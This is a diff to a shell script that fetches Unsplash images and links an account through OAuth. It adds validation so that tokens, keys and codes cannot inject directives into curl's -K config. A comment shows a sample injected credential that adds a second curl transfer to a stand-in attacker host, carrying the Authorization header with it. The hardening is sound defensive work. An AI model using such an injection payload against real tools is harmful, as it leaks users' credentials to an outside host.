@@ -526,15 +526,54 @@ unsplash_user_token() {
         security find-generic-password -s unsplash-user-token -w 2>/dev/null
 }
 
+# Keeping a credential off argv is only half the problem: curl's -K config is
+# a GRAMMAR, `directive = "value"`, so a quote inside a value ENDS it and a
+# following newline starts a NEW directive. A credential carrying
+#     goodtoken"\nurl = "http://attacker.invalid/
+# makes curl perform a SECOND transfer to a target we never chose — and the
+# Authorization header travels with it. So every credential is validated
+# here, at the point it enters the grammar, against a closed token set: the
+# characters real Unsplash keys, secrets, tokens and codes actually use, and
+# nothing that can reach the syntax. Every SOURCE goes through this — env,
+# Keychain and pasted alike. "The owner set it" was the wrong test: the same
+# variable is also read from a Keychain item, and a value that can travel is
+# a value that can be wrong.
+require_credential() { # $1 what-it-is, $2 value — dies in the CALLER's shell
+    case "$2" in
+    '') die "$1 is empty" ;;
+    *[!A-Za-z0-9._~+/=-]*)
+        die "$1 contains characters that cannot occur in an Unsplash credential (letters, digits and . _ ~ + / = - only) — refusing to build a curl request with it" ;;
+    esac
+}
+
 # ONE curl -K config line carrying the strongest available credential —
 # stdin config, never argv, so neither token nor key ever reaches `ps`.
+#
+# WHERE the check has to live: every caller runs this function inside a
+# pipeline, and two of them inside $( ) as well, so a `die` in here would
+# exit only that subshell and the script would sail on. The binding check is
+# therefore unsplash_auth_check below, called from the command functions in
+# the MAIN shell where exiting means exiting. The guard here is the second
+# layer: if a future caller forgets the check, this refuses to EMIT the
+# poisoned line, so curl still never receives an injected directive.
 unsplash_auth_line() {
     local tok
     tok=$(unsplash_user_token)
-    if [ -n "$tok" ]; then printf 'header = "Authorization: Bearer %s"\n' "$tok"
-    else printf 'header = "Authorization: Client-ID %s"\n' "$(unsplash_key)"
+    if [ -n "$tok" ]; then
+        require_credential 'the Unsplash account token (UNSPLASH_USER_TOKEN / Keychain unsplash-user-token)' "$tok"
+        printf 'header = "Authorization: Bearer %s"\n' "$tok"
+    else
+        local key
+        key=$(unsplash_key)
+        require_credential 'the Unsplash access key (UNSPLASH_ACCESS_KEY / Keychain unsplash-access-key)' "$key"
+        printf 'header = "Authorization: Client-ID %s"\n' "$key"
     fi
 }
+
+# Validate the credential that unsplash_auth_line WOULD emit, from the main
+# shell, before any request is built — so a hostile value dies cleanly with
+# zero transfers rather than part-way through a pipeline.
+unsplash_auth_check() { unsplash_auth_line >/dev/null; }
 
 # One-time account link: OAuth authorization-code exchange with the out-of-
 # band redirect (the code shows in the browser; the user pastes it here).
@@ -550,6 +589,11 @@ cmd_unsplash_auth() {
     [ -n "$secret" ] || secret=$(command -v security >/dev/null 2>&1 &&
         security find-generic-password -s unsplash-secret-key -w 2>/dev/null)
     [ -n "$secret" ] || die "the exchange needs your app's SECRET key (shown beside the access key at https://unsplash.com/oauth/applications): export UNSPLASH_SECRET_KEY, or store it once with \`security add-generic-password -s unsplash-secret-key -a \"\$USER\" -w\`"
+    # Both halves enter curl's -K grammar below as `data = "…"` values, and
+    # the key also enters a URL handed to the browser. Check them here, in the
+    # main shell, before either can travel.
+    require_credential 'the Unsplash access key (UNSPLASH_ACCESS_KEY / Keychain unsplash-access-key)' "$key"
+    require_credential 'the Unsplash app secret (UNSPLASH_SECRET_KEY / Keychain unsplash-secret-key)' "$secret"
     authurl="https://unsplash.com/oauth/authorize?client_id=$key&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&scope=public"
     note "opening the authorize page — sign in as your Unsplash+ account and approve"
     if command -v open >/dev/null 2>&1; then open "$authurl"; else note "open: $authurl"; fi
@@ -562,6 +606,11 @@ cmd_unsplash_auth() {
     # the charset gate so a padded paste of a valid code is not refused.
     code=$(printf '%s' "$code" | tr -d ' \t\r\n')
     case "$code" in '' | *[!A-Za-z0-9_-]*) die "that does not look like an authorization code (letters, digits, - and _ only) — copy just the code text, without surrounding characters" ;; esac
+    # Belt and braces: the code is about to become a `data = "…"` value, so it
+    # passes the same gate as every other credential. The case above is the
+    # stricter of the two and gives the better message; this one is what a
+    # future edit to that pattern cannot accidentally loosen past.
+    require_credential 'the authorization code' "$code"
     json=$(printf 'data = "client_id=%s"\ndata = "client_secret=%s"\ndata = "redirect_uri=urn:ietf:wg:oauth:2.0:oob"\ndata = "code=%s"\ndata = "grant_type=authorization_code"\n' "$key" "$secret" "$code" |
         curl -fsg --max-time 30 -K - "https://unsplash.com/oauth/token") ||
         die "token exchange failed — wrong/expired code, or the app's redirect URIs do not include urn:ietf:wg:oauth:2.0:oob (add it on the dashboard)"
@@ -579,6 +628,9 @@ cmd_unsplash() {
     local key url json img_url w h slug dl who query="$1" pick=""
     key=$(unsplash_key)
     [ -n "$key" ] || die "no Unsplash key: export UNSPLASH_ACCESS_KEY, or run \`security add-generic-password -s unsplash-access-key -a \"\$USER\" -w\` after getting a free key at https://unsplash.com/oauth/applications"
+    # Grammar-check the credential that will be embedded in curl's -K config,
+    # here in the main shell, before a single request is built.
+    unsplash_auth_check
     case "$1" in
     *://*)
         # A pasted link fetches THAT photo via the API's /photos/:id (which
@@ -667,6 +719,9 @@ cmd_unsplash_status() {
     local key limit remaining
     key=$(unsplash_key)
     [ -n "$key" ] || die "no Unsplash key: export UNSPLASH_ACCESS_KEY, or run \`security add-generic-password -s unsplash-access-key -a \"\$USER\" -w\` after getting a free key at https://unsplash.com/oauth/applications"
+    # Grammar-check the credential that will be embedded in curl's -K config,
+    # here in the main shell, before a single request is built.
+    unsplash_auth_check
     scratch_new
     unsplash_auth_line |
         curl -fsg --max-time 15 -K - -D "$SCRATCH" -o /dev/null \
